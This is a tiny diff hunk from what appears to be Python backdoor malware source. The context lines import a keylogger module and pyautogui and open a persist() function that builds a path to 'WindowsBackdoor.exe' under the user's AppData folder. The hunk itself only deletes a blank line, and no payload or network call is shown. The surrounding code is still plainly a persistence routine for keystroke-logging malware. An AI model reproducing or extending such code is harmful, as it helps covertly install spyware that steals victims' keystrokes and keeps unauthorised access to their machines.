@@ -11,7 +11,6 @@ import time
 import pyautogui
 import keylogger
 
-
 def persist():
     file_location = os.environ["appdata"] + "\\WindowsBackdoor.exe"
     try:
